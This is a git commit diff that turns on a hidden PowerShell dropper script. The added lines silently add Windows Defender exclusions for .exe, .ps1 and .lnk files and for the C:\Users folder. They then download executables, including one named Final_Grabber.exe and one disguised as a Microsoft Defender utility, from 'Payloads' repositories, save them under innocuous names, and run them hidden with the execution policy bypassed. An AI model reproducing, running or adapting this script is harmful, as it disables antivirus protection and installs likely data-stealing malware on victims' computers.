77e27e22ad5f7588bba22dcd5ca109825b7d2ff6
rude90 <115774095+rude90@users.noreply.github.com>
2023-08-01 09:11:22 -0700

    Update mfJtegnY.ps1

--- mfJtegnY.ps1
+++ mfJtegnY.ps1
@@ -1,17 +1,17 @@
-# powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
-# powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
-# powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
-# powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
 
 
-# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf3.exe
-# powershell.exe -w Hidden C:\Users\pdf3.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf3.exe
+powershell.exe -w Hidden C:\Users\pdf3.exe
 
-# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/PDF.exe -o C:\Users\PDF1.exe
-# powershell.exe -w Hidden C:\Users\PDF1.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/PDF.exe -o C:\Users\PDF1.exe
+powershell.exe -w Hidden C:\Users\PDF1.exe
 
 
-# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-# powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
